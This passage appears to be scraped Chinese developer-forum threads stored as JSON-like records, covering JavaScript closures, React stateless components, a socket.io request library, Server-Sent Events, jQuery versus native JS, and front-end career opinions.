"线程安全很重要，小心些哈。", " 没太懂，你前端数据从哪里读？", " 好的，我先学下这两个框架\r", "\r", " 看了下 BOA 好像好久没更新了，但简单轻量； gohead ，应该是 goAhead ，比较新，功能也比较全，也会大一点。当初怎么都没发现……刚开始的时候脑子一热，入了 libuv 的坑，然后想反正都入坑了，自己再干脆写个合适的 HTTP Server 算了，于是……已经遇到过线程死锁的问题了，还好解决了。目前还凑合，已经写了个配套的 Android APP 用着。但缺了 PC 上面的客户端，于是就想通过 Web APP 来实现，省去了安装过程，还有跨平台的优势。\r", "\r", " 发给浏览器的数据还是来自设备，只不过都是 json 纯数据，第一次请求静态文件后就不再包含 html 等界面代码", "   sorry 用词不当了，\r", "只是很多场景 像 openwrt 都是 lua 做 http 应用的", " 如果是路由，建议直接从 op 改，不过 op 这么多年 确实不好改"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>虽然工作中 js 和闭包用起来没问题，但是发现要讲清楚还是有蛮多细节自己不清楚的，整理和写下一个知识点，在这个过程中对自己提升也蛮大。希望能帮助新人，老手勿喷。</p>\n<p><a href=\"http://sharejishu.com/javascript/2016/12/08/javascript-clousure.html\" rel=\"nofollow\">http://sharejishu.com/javascript/2016/12/08/javascript-clousure.html</a></p>\n</div></div>", "<div class=\"topic_content\">不好意思，博客地址改了\r<br><a target=\"_blank\" href=\"http://sharejishu.com/posts/javascript-closure.html\" rel=\"nofollow\">http://sharejishu.com/posts/javascript-closure.html</a></div>"], "reply": "11", "tittle": "JavaScript 闭包学习", "comment": ["clousure??", " 哈哈，眼睛真厉害", "404 Not Found", " 改成 closure 了", " 不好意思，博客地址改成了 ", "\r", " 你好热心啊，感谢捧场", "新博客？就一篇？", "看看《你不知道的 javascript -上卷》，写的挺不错", " 是啊，刚开 :)\r", " 好，我来看看", "![]( ", " )", " 咦，竟然不能评论？难道是友言的 bug ，你用的什么浏览器？ QQ 登陆的吗？", "   额 应该是 QQ 登录的  谷歌浏览器"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h1>造轮子初衷</h1>\n<p>前端向后端请求数据从上古时期就不是什么新鲜事，后端向前端推送数据自从有了 <a href=\"http://socket.io\" rel=\"nofollow\">socket.io</a> 这种神器以后也没什么大不了的了，那为啥后端为什么不可以向前端那用个类似 Ajax 的东西请求数据？于是我就造了这么个东西 <a href=\"https://github.com/bramblex/io-request\" rel=\"nofollow\">IORequest https://github.com/bramblex/io-request</a> ，不仅能用 <a href=\"http://socket.io\" rel=\"nofollow\">socket.io</a> 像 Ajax 一样从前端向后端发送请求，同时也可以从后端向前端发送请求。</p>\n<h1>简单例子</h1>\n<p>假设我们现在要做一个简单 web 版本的猜拳对战游戏，服务器端的游戏逻辑只需要这样写</p>\n<pre><code>class Game {\n\n  constructor (left, right) {\n    co(function *() {\n      const home_id = next_home_id++\n      left.emit(`msg`, `游戏开始，游戏房间号[${home_id}]，等待你出拳`)\n      right.emit(`msg`, `游戏开始，游戏房间号[${home_id}]，等待你出拳`)\n      \n      // 这里就是向前端请求 choice 方法，并且等待前端的返回\n      const [l, r] = yield [\n        left.ioRequest({method: 'choice'}),\n        right.ioRequest({method: 'choice'})\n      ]\n\n      // 后端接受到前端的返回后继续游戏的进程\n      const _choices = [null, '布', '剪刀', '石头']\n      left.emit('msg', `你出的是[${_choices[l]}], 对方出的是[${_choices[r]}]`)\n      right.emit('msg', `你出的是[${_choices[r]}], 对方出的是[${_choices[l]}]`)\n\n      // 比较并且得出结果\n      if (Game.compare(l, r)) {\n        left.emit('msg', '你赢了')\n        right.emit('msg', '你输了')\n      } else {\n        right.emit('msg', '你赢了')\n        left.emit('msg', '你输了')\n      }\n\t\t\n      // 游戏结束，关闭链接\n      right.disconnect()\n      left.disconnect()\n\n    })\n  }\n}\n</code></pre>\n<p>而前端逻辑更简单了</p>\n<pre><code>  // 前端在这里只需要处理后端发送的 choice 请求，并且处理完后通过 response 返回请求的数据\n  ioReqClient.handle('choice', ({response}) =&gt; {\n    const choices = document.getElementById('choices')\n    choices.style.display = 'block'\n\n    const shi = document.getElementById('shi')\n    const jian = document.getElementById('jian')\n    const bu = document.getElementById('bu')\n\n    // 当按钮被点击的时候\n    shi.onclick = () =&gt; {\n      response(3) // 在这里给后端返回\n      choices.style.display = 'none'\n      msgLog('我出的是[石头]')\n    }\n    \n    // 同上\n    jian.onclick = () =&gt; {\n      response(2)\n      choices.style.display = 'none'\n      msgLog('我出的是[剪刀]')\n    }\n    \n    // 同上\n    bu.onclick = () =&gt; {\n      response(1)\n      choices.style.display = 'none'\n      msgLog('我出的是[布]')\n    }\n  })\n</code></pre>\n<h1>完整例子</h1>\n<p>这里是上面那个例子的完整实现。\n<a href=\"https://github.com/bramblex/io-request/tree/master/example\" rel=\"nofollow\">https://github.com/bramblex/io-request/tree/master/example</a></p>\n</div></div>"], "reply": "3", "tittle": "[造轮子] 所以为啥后端不能向前端请求数据？", "comment": ["你想要的是 Wt", "Reverse Ajax, Part 1: Introduction to Comet\r", "思路不错"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>正在用 React ，也就顺手翻译了篇 React 相关的文章，文章主干</p>\n<p>九个你忽略的 React 无状态组件的优势</p>\n<ul>\n<li>Class 并无必要</li>\n<li>没有<strong>this</strong>关键字</li>\n<li>被迫使用最好的方法</li>\n<li>高信噪比</li>\n<li>代码自动补全</li>\n<li>很容易找出来臃肿的组件和低劣的数据结构</li>\n<li>便于理解</li>\n<li>便于测试</li>\n<li>表现</li>\n</ul>\n<p>译文： <a href=\"http://www.zcfy.cc/article/1980\" rel=\"nofollow\">http://www.zcfy.cc/article/1980</a></p>\n<p>翻译不到之处，也可以评论里提出来。。</p>\n</div></div>"], "reply": "7", "tittle": "九个你忽略的 React 无状态组件的优势", "comment": ["我发现我常干的一件事就是把无状态组件转成有状态的，因为我用的 mobx 只能监听 render 里面的状态变化，这样做可以免去通过 props 传递状态的麻烦。减少组件的层级同时可以避免项目的过于碎片化，便于后续的调整。\r", "\r", "当然， 无状态组件肯定是更加有利于测试和重用，以及性能优化的，但对于一个发展期的项目而言，我更看重的是灵活性。\r", "\r", "我希望开发者多已自己实际情况进行思考权衡，而不是盲目相信所谓权威。", " 你说的有道理，我没有在项目中用过 mobx ，但不要迷信权威这一点我还是认同的。我也是最近才了解到无状态组件，用 eslint-airbnb-config 在没有状态的组件中 lint 有提示要使用无状态组件的写法，也就逼着自己尽量按照一些规范来。", "对于无状态的组件一般都是直接 export 出去， export default xxxx ，只用作渲染，父 container 传递数据和事件绑定到无状态组件。\r", "\r", "然后无状态组件再绑定数据和事件。这样子就能重用", " 学习了。", "antd 官方基于 dva 的例程里面，所有组件都是无状态的，但是很多场景并不方便，比如一个倒计时的按钮，也得在全局 state 里面放倒计时计数", " 我也正在用 antd ，只是没有用 dva ， antd 官方的例程上并没有见到无状态组件，倒是看的还在用 React.createClass({}) 这种方式 。 ", "   \r", "\r", "dva 倒是有些了解，按我的理解是对 react+redux 进行了封装，形成了自己的一套框架。还是想要把状态和表现分离开，所以用无状态组件也不奇怪了。能不能给个你说的例程链接，我瞅瞅。", "同意，很好的做法"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"http://4.baring.cn/quo/bin/quotation.dll/page/pageinfo.html?page=http://4.baring.cn/quo/bin/quotation.dll/page/ytcj.com.forexhome.htm\" rel=\"nofollow\">http://4.baring.cn/quo/bin/quotation.dll/page/pageinfo.html?page=http://4.baring.cn/quo/bin/quotation.dll/page/ytcj.com.forexhome.htm</a></p>\n<p>这个页面的数据更新很快，我想得到数据，实时存入 Redis ；</p>\n<p>网上找了很多资料，没有解决，求大家赐教。</p>\n</div></div>", "<div class=\"topic_content\">用 Chrome 内核浏览器或者 Firefox</div>"], "reply": "4", "tittle": "如何获取 EventStream 中的数据 Server-sent Events", "comment": ["啥意思? 它好像没做验证 直接这样就能取到 event data:\r", "\r", "const src = new EventSource('http://4.baring.cn/quo/bin/quotation.dll?fields=Price,LastSettle,High,Low,&symbols=USDINIW,USUSDCNY,USGBPUSD,USEURUSD,USUSDJPY,USAUDUSD,USUSDCAD,USUSDCHF,USNZDUSD,USUSDHKD,WHHKDCNY,WHCNYJPY,')\r", "\r", "src.onmessage = event => {\r", "     console.log(event.data)\r", "}", "直接用 跨域 请求不到数据", "为啥我进去看不到数据？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><img alt=\"\" src=\"http://ww3.sinaimg.cn/mw690/a60a3287jw1faqpq5mryjj212v0or421.jpg\"><br>\n<a href=\"https://github.com/ahonn/hexo-theme-even\" rel=\"nofollow\">https://github.com/ahonn/hexo-theme-even</a></p>\n</div></div>"], "reply": "1", "tittle": "这个代码高亮风格是什么库？", "comment": ["虽然一眼就看出来是 solarized \r", "然而还是去 github 搜了一下确认\r", "1. 打开网页 看下 css\r", "2. github 搜 highlight  keyword 859900"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"http://jgthms.com/web-design-in-4-minutes/\" rel=\"nofollow\">http://jgthms.com/web-design-in-4-minutes/</a>\r<br><a target=\"_blank\" href=\"http://zh.learnlayout.com/\" rel=\"nofollow\">http://zh.learnlayout.com/</a>\r<br>看完这两个 html css 你就入门了\r<br>\r<br><a target=\"_blank\" href=\"http://javascript.ruanyifeng.com/\" rel=\"nofollow\">http://javascript.ruanyifeng.com/</a>\r<br>这个是 js 界著名的阮老师，很多写的深入浅出\r<br>这个更像是手册，如果更循序渐进可以看\r<br>《 JavaScript DOM 编程艺术》 <a target=\"_blank\" href=\"https://book.douban.com/subject/1921890/\" rel=\"nofollow\">https://book.douban.com/subject/1921890/</a>\r<br>\r<br><a target=\"_blank\" href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/A_re-introduction_to_JavaScript\" rel=\"nofollow\">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/A_re-introduction_to_JavaScript</a>\r<br><a target=\"_blank\" href=\"http://javascript.crockford.com/zh/javascript.html\" rel=\"nofollow\">http://javascript.crockford.com/zh/javascript.html</a>\r<br>这两篇可作为 js 快速指南 和 总体印象\r<br>第一个网站几乎是事实上的标准\r<br>第二个网站是号称 js 教父的博客</div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><h2>进阶</h2>\n<h3>CSS</h3>\n<ul>\n<li>《CSS权威指南》</li>\n</ul>\n<h3>JS</h3>\n<ul>\n<li>《JavaScript 高级程序设计》第3版</li>\n<li>《JavaScipt 语言精粹》\n配合http://<a href=\"http://list.youku.com/albumlist/show?id=26834721&amp;ascending=1&amp;page=1\" rel=\"nofollow\">list.youku.com/albumlist/show?id=26834721&amp;ascending=1&amp;page=1</a>\n<a href=\"https://www.youtube.com/watch?v=JxAXlJEmNMg&amp;list=PL7664379246A246CB\" rel=\"nofollow\">https://www.youtube.com/watch?v=JxAXlJEmNMg&amp;list=PL7664379246A246CB</a></li>\n<li>《JavaScript 忍者秘籍》配合jQuery 源码</li>\n<li>《面向对象分析与设计》配合Java</li>\n<li>《计算机程序的构造与解释》配合Scheme</li>\n</ul>\n</div></div>", "<div class=\"topic_content\">WEB 前端技能思维导图\r<br>\r<br><a target=\"_blank\" href=\"http://photo.weibo.com/1585228362/wbphotos/large/mid/4078006516953227/pid/5e7caa4aly1fczdoqzikfj219p1ts1a2\" rel=\"nofollow\">http://photo.weibo.com/1585228362/wbphotos/large/mid/4078006516953227/pid/5e7caa4aly1fczdoqzikfj219p1ts1a2</a>\r<br>\r<br><a target=\"_blank\" href=\"http://wx4.sinaimg.cn/mw1024/5e7caa4aly1fczdoqzikfj219p1ts1a2.jpg\" rel=\"nofollow\">http://wx4.sinaimg.cn/mw1024/5e7caa4aly1fczdoqzikfj219p1ts1a2.jpg</a></div>"], "reply": "26", "tittle": "html、css、js 入门指南", "comment": ["不是 ", " 么？", "挺好，顶一个~", " MDN 似乎更好， ", "马了先~~", "资瓷一下", "目前正在学，感谢", "Mark", "给力，感谢分享", "挺好，顶一个~", "js 教父？", " \r", " \r", "这个网站的教程比较贴近实践一点，很多 CSS 布局都给出了最佳实践，比如 float clear 之类的，不用自己查了。", "感谢，正在学习", " w3school 之前被批过，忘了是哪个帖子了", " 能不能简单说说有什么问题？好奇下", "不知道这里有多少“十八哥”的”学生“。", " 批的是 com.cn 吧， com 也批？", " 最早国外社区批的就是 com", "    真相了", " 多垃圾啊", " 好像是说错误多，还有误导性什么的，推荐了 MDN ，因为不是做 web 开发的，所以我只是大概看了一下没记住细节", " 不记得是 com 还是 com.cn 了", "MDN+1\r", "JavaScript DOM 编程艺术 +1", "刚好今天教 JS ，先 Mark", " \r", " \r", " 十八哥是哪位英雄啊？", "js 还没找到感觉，仍在学习"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>场景：某个微信移动端网页，有个可以拖动的列表，在 iOS 里往上拉到列表底部的时候，整个网页会被“拉”上去，露出深灰色微信背景，大家在 iOS 试一试就知道了。</p>\n<p>需求：上面的情况是允许的，但是当我点击列表项弹出窗口后，就不允许整个网页会被“拉”上去。所以我想在没有弹出窗口时，页面允许滑动，当弹出窗口后，就不允许滑动事件了。</p>\n<p>问题：我的解决方法是，弹出窗口后，用 document.addEventListener 和 document.removeEventListener 来禁止、解除禁止滑动事件，我的代码如下</p>\n<p>//禁止滑动</p>\n<p>function dontmove(e) {\ne.preventDefault();\nconsole.log(e);\n}</p>\n<p>document.addEventListener(\"touchmove\", dontmove(event), false);</p>\n<p>//解除禁止</p>\n<p>document.removeEventListener('touchmove', dontmove(event), false);</p>\n<p>但是上面的方法不奏效，当我把禁止滑动换成：</p>\n<p>document.addEventListener(\"touchmove\", function(e) {\ne.preventDefault();\nconsole.log(e);\n}, false);</p>\n<p>就可以禁止滑动了，但是这个匿名函数没办法用解绑啊，而且手指上滑时，在 console 看到前者输出来的 Event 是：</p>\n<p>MouseEvent {isTrusted: true, screenX: 209, screenY: 577, clientX: 320, clientY: 902 …}</p>\n<p>而后者，匿名函数输出来的是：</p>\n<p>TouchEvent {isTrusted: true, touches: TouchList, targetTouches: TouchList, changedTouches: TouchList, altKey: false …}</p>\n<p>在手机端输出也是一样的，请问在同样的操作下，为什么 addEventListener 传入的 Event 对象不一样？</p>\n</div></div>"], "reply": "2", "tittle": "为何同样的操作下， addEventListener 传入的 Event 对象不一样？", "comment": ["document.addEventListener(\"touchmove\", dontmove(event), false);\r", "\r", "=>\r", "\r", "document.addEventListener(\"touchmove\", dontmove, false);", " 谢谢指正，但是仍然无法解绑或恢复默认事件"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"http://angularjs.blogspot.com/2016/12/ok-let-me-explain-its-going-to-be.html\" rel=\"nofollow\">http://angularjs.blogspot.com/2016/12/ok-let-me-explain-its-going-to-be.html</a></p>\n<p>健步如飞啊</p>\n</div></div>"], "reply": "13", "tittle": "angular 4 ...... 神秘", "comment": ["然而 React 从 0.1x 一下到了 V15", " React 那是临时改变了版本号策略， Angular 可是小步快跑式的变号，果然 Google 推动产品（ Chrome 同门师兄弟）", "看来 Angular 下个版本号是 Angular 8", " react 那只是版本策略，并没有像 angular 跳崖升级吧？", "哦，节奏好快。不过也还好，像 node 4 到 6 基本不用改什么代码。", "angular 新版本好策略: 2^n", "已经出了 ng4beta0 版了", "还在用 1 的一脸懵逼", "React 因为 build 的时候，本来是 0.15 的，不小心少了个点，变 15 发布了", "支持 支持，肯定又有新的特性出来了，", "还在学 NG2 的人一脸懵逼", " \r", "\r", "-6", "事情是酱紫的 昨天看到了这帖子 就去看了下官方的声明 就很好奇说 2 刚出来明年就出 4 是要闹哪样 正好昨晚有上海 dgd 的一个活动请到了 angular 的几个核心开发者 我就问了下 大概意思就是 版本变化大只是数字的变化 至少从 1.4 以后 或是 2   都好迁移的 嗯 还是拭目以待吧"]},
{"content": ["<div class=\"topic_content\">对，就是这个\r<br>\r<br><a target=\"_blank\" href=\"http://youmightnotneedjquery.com/\" rel=\"nofollow\">http://youmightnotneedjquery.com/</a>\r<br>\r<br>左右对比，说明你用 jQuery 做的事用原生 JS 方法都能做。\r<br>可是对比起来，原生方法写的基本都是又臭又长。。简直了，这个网站可以改名成：\r<br>\r<br>为什么你需要 jQuery</div>"], "reply": "75", "tittle": "听闻 jQuery 过时了，还被安利了这么一个网站。。看的尴尬癌都犯了", "comment": ["应该有个工具，把 jQuery 的代码编译到 vanilly.js\r", "(当然，只兼容现代浏览器。)", "目前我还是觉得 jq 蛮好的，人家也一直在更新", "有这样一句话\r", "\r", "> If you're developing a library on the other hand, please take a moment to consider if you actually need jQuery as a dependency\r", "\r", "我觉得没啥问题。\r", "\r", "这个网站不错，感谢安利。", "我觉得应该叫为什么你还用 ie 系列", "网站不错，感谢安利。\r", "毕竟天猫都要取消对 IE8 及以下的支持了\r", "也体现出浏览器环境在逐渐变好，以至于 jquery 的存在价值没有以前那么高了\r", "\r", "不过题主说的“说明你用 jQuery 做的事用原生 JS 方法都能做”\r", "这个还需要说明么。。。 jQuery 不就是用原生 js 写的", "我曾经想了半天。我用 jQuery 的时候， 90%在用元素选择器， 10%在用$.get $.post 。\r", "\r", "想完以后就换成 cash 这种库了。", "当时看到我也是这个感受 😓。", "有些写法在低版本浏览器上原生 js 才叫崩溃，从 ie6 过来的人感谢 jq 拯救", "高端黑啊", "是个不错的网站！", " 同感。。。", "jQuery 能做的原生的 js 肯定都能做啊，不然 jQuery 怎么来的呢？", "既然来到 v 站可以去膜拜下那个叫 mingeJS 的，哈哈哈", " 哈哈哈，图灵等价", " 是的呀， jquery 不就是用原声 js 写出来的吗", " 有什么理由？", "高端黑吧", "坐等 youdontneedunderscore", " ", "你们需要 angry.js 和 react naive", "不过说过来 包括 fetch 和 axios ，这么多 ajax 库，就$.ajax 是给人用的，其余的用法都超级 geek\r", "不要给我说标准，标准是什么，标准是写给大牛和要面试的人看的，其余时候绝对是反人类的东西", "有什么工具可以说，自动将需要 jq 的 js ，自动转换成不需要 jq 也能用的东东。。", " 23333 yeah!", " 这个可以", "虽然 jqeury 解决兼容性方面做得很不错，但用了 react 之后很少有用 jquery 的需求了。", ":joy:", "请了解英文中 might 的语气……", "目前前端太重了，前端技术到 jquery 已经够用了。 jquery 太伟大了，真应该直接集成到浏览器里成为标准。", "\r", "抛弃 jQuery ，拥抱原生 JavaScript", "rails 已经不原生集成 jquery 了", "用 jquery 是为了用它丰富的插件嘛，话说你们都自己写控件的吗？", "说真的， jquery 两句话的事，为什么要用一段 JS 来解决呢，我就觉得 jquery 挺好", " 換個角度，只需要加載一段原生 js 的事，為什麼要用一整個龐大的 jQuery 庫呢？", " \r", " 你们一个站在开发速度的角度上，一个站在加载速度的角度上，事物的两面性嘛", " 开发起来简单方便。。。。。。现在电脑的渲染速度已经很快了。。。。。。没必要刻意注重那么多性能。。。。。一切都只为开发更简单。。。。", "36 楼的句号怎么跑到外面去了", " jquery 庞大吗？几十 kb 而已，对于现在的网络来说不算啥。", "一边用着各种 IDE/自动化工具，一边说 JQ 臃肿原生 js 优雅。我想说至于么？\r", "当然，用纯文本编辑器+0 插件裸写前端代码的真神可以这么说，我服。", "看了这个帖子,对比了使用 jq 和不使用 jq 的代码量, 我的结论是:还是用 jq 吧,何必苦了我们程序员自己?", "直接无视作者的意思断章取义真的好吗?", "现在物质和精神丰富了，过去从中国到美国，都选择坐飞机、坐轮船、开汽车（然后中转）。\r", "而现在时代变迁了，人要寻求刺激，因此请 徒步+游泳 到美国 （或者打造一支火箭，飞过去）。\r", "这就是 JQ 过时的真正原因。", "这个网站的意思是为什么不用 jq 好吧", "这篇文章的本意应该是，在某些环境下，你可能不需要用 jquery ，然后告诉你一些对应原生写法，让你可以选择；\r", "并不是让你用原生来做开发；（注意环境）", "原文作者在说如果你是在做一些库，你可能并不需要 jquery ，我觉得没毛病", "看了网站，赶紧敲了几行 jquery 代码压压惊", "什么叫你用 jQuery 做的事用原生 JS 方法都能做？ 真把 JQ 当成一门语言了？还和原生 JS 比较起来了？没 JS 哪儿来的 JQ ？那不就是一 toolkit 吗？（我也不想掺杂着说，只是翻译成工具集，说着别扭）", "楼主不懂英语？看不明白网页最上面三段话的意思？", "哈哈，整天瞎瓣不如多敲两行代码 ，顺便说一下： jquery,js 关我什么事，反正 php 是最好的语言", " 庞大吗", " \r", " 呃，好像的確也不會龐大，順口說出來了……不過也是想盡量減少項目的依賴", "library 和 application 太难界定了，项目做着做着都会变成 library ，我从类似 prototype 、 angular 、 react 的东西一路做过来，每次看到大公司在做同样的东西，都泪流满面，全世界每时每刻都有无数的人产生同样的想法，所以真的不要重复造轮子啊\r", "\r", "我个人的体会是，可以的话多参与和交流， FOSS 精神非常有意义，如果你不喜欢 jQuery ，大可帮助改善它，而不是自己做一套功能几乎一样的东西", "\r", "problem solved", "。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。", "。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。句号不能换行么", "hahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahaha", "看需求选择，不是为了使用新技术而去使用", "这不是个高端黑的网站么。。", "为什么现在都有跑步机了，还是有人在夜跑。这个道理是一样的。", "我觉得不错", "视情况而定吧，有的网页，一个元素选择就要引个 jQuery ，实在没必要。", "明明 jq 的出现是为了解决浏览器的不兼容问题，你用早起 ie 发一个 xhr 、注册个事件试试就知道了。", " 问题是，可能加载很多段呀。。", "jq 入门好东西，感谢推荐啊，哈哈", "等你们年纪大一点 去面试时不会右边的东西 会更尴尬的", "jq\r", "实际上用的多的就选择器。\r", "\r", "要是写功能多，复杂的东西。\r", "\r", "就是原型链了。", "。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。", "妈妈说就算你注册的域名再长百度都能搜索出来。\r", "www 。 mamashuojiusuannizhucedeyumingzaichangbaidudounengsousuochulai 。 cn", " 对于服务器高并发的带宽呢", "谁来个 ", "you might not need (请填空)...", "might +1 觉得原作者说的没错", "用 jQuery 是因为浏览器兼容性。。不是因为写起来短", "工具而已，较真.你用 coffeejs 不也一样，怎么方便怎么来，又不是后端代码， app 代码要求高."]},
{"content": ["<div class=\"topic_content\">0 、前端轮子化\r<br>       2016 年，前端框架、组件更新换代都非常快，目前造了 n 多轮子，但大多数时候仅是程序员拿去滚了玩。举个不恰当的例子：假如轮子拿来生产不出一辆辆能上路的车。要这轮子何用呢？研究轮子怎么转？然后再造个更好点的轮子?难道前端要是专业轮子生产户?\r<br>1 、前端编程化\r<br>      以前的前端，是要写 HTML ， css ， JS 的，而现在的前端，已经不用去写这些了，因为一个个框架（类库）里已经集成了相应的组件和相应的 css 样式。只要会 js 语言按相应规范就能完成了。但面临的语言规范则需要编译后才能工作。某种程度来说，提高了开发效率。但对于初学者来说，比以前更难入门。\r<br>2 、前端全栈化\r<br>      全栈，也就是说某个项目的技术栈。加个前端，这里的前端就等于 js 语言。 js 语言在不同的地方又有不同的规范。仅从目前网络上来说，前端全栈化的可供普通站长使用的系统程序比较少。所以知名度很低。别的不说，就 PHP 的（ dz ， cMs 类， shop 类）等系统普及了多少年。 JS 还有很长的路要走。前端全栈化，概念是很好，但是又有多少个普通站长会全栈?仅靠现在写轮子的程序员，靠现在写自己公司项目业务的程序员发展前端全栈，那只能一直在 PHP 和 Java 后面望尘莫及了。</div>"], "reply": "41", "tittle": "对于前端的几点个人看法", "comment": ["楼主没有真的负责过前端开发吧？我要说出来想用模版不自己写 css 了估计要被同事给打死😂\r", "还有轮子，前端不是轮子太多的问题，是轮回的问题了。以前谁要在 js 里加 html 代码不被骂死，看看现在最新的组件化思想，又回去了。但是思想跟明确了，就是要能适应变化", " \r", "\r", "这是组件化的思想，偏应用，现在可以尝试搞搞\r", "\r", "如果你的 web 偏页面展示的，各种 CSS HTML 奇淫技巧 非常繁杂，又何必趟组件化这趟浑水？", "每次看到这种帖子 我就知道会🔥", "前端无论外表多光鲜 底层都是原型链的丑陋", " 引入 css 框架，组件，只用写一小部分。像按钮之类的定个颜色就 OK 了啊", "前端世界真奇妙，哈哈～", "我感觉你刚入行不是很长时间。首先呢！前端现在真的很火。但是这并不代表的是一种非此即彼的关系，也就是说学 Java 和 PHP 等后端语言的人是不是就 OUT 了。造轮组的目的肯定是为了提高效率，但是轮子的应用规模取决于有多少人用。轮子很多，但是整体的编程思想无非是那几个而已。只是语法不一样而已。关于刚入门来说：学好 HTML ， CSS ， JavaScript 还是很有必要的。关于那些轮子的话，用到那个学那个，不用那个做一些了解就好。现在已经不是学的越多越 6 的年代了，选择更重要一些！", "只能总结……楼主不是从事前端工作", "  从 css 那部分就看出来你不是干的前端的工作。。。 css 框架本身有一定的风格，和你公司的视觉风格一样么，除非你公司没有视觉设计。如果用 css 框架满足和其本身不同的设计，需要的工作量比不用 css 框架只多不少。。", "这两天看了不少这样的论调，还有楼主这帖子内容好像在哪看过。\r", "只想说： MDZZ", "怎么最近好多不懂前端的都跳出来品头论足了。就像不同的前端框架有不同的适应场景，框架更新说明更好的出来了。而且也没那么快，像偏数据类的网站 angular 一直是比较好的方案", "前端说的多高大上，其实就是 JS 套个壳。\r", "\r", "自己往自己脸上贴金罢了\r", "\r", "技术含量？\r", "\r", "对不起，请先解决轮子间兼容问题", " 组件化 和 “偏应用 /偏展示” 关系不大，模块化 /组件化的三大好处：复用性、维护性、分而治之，这是趋势，确实繁琐，但我认为还是要尽量往组件化上靠，传统的前端开发方式基本淘汰了...  \r", "回楼主： CSS 肯定是需要的，组件样式的定制、自己开发组件，都是非常依赖 CSS 的", "感觉是想趁着最近阿当那个事火一把。\r", "一派胡言", "  不认同你的观点 - 把前端最几年的飞速发展总结为 “ JS 套个壳”，踩过传统前端开发方式的坑，再接触现在的前端开发方式，才能更理解前端的进步，另外。。。轮子间的兼容问题 是什么意思 。。。", "我觉得前端的火是因为其跨平台的特性，目前依托 browser 这个世界上规模最大的天然解析器，已遍布多端领域。人嘛，就是懒，不想在每一端都重新搞个 APP ， react 之所以火还不是就是 react native 可以统一三端么。就像当年 .net 和 java 刚出来的时候还平分秋色，但 .net 不具备跨平台性太限制了，现在开发 .net 的比 java 的少多了。", "总感觉这些言论都是非前端的人眼红、急眼了而已！我们前端再怎么折腾，碍你们什么事了！以前说前端没技术含量，现在又说门槛高了，你们到底想干嘛啊？", " \r", " \r", "所以说你们没有呆在前端部门，不知道真正的痛点是 PM", " 要真只是 js 就太好了。", " 天朝比较少，海外.net 很多公司用", "> 因为一个个框架（类库）里已经集成了相应的组件和相应的 css 样式\r", "\r", "你这说的是 UI 框架", " 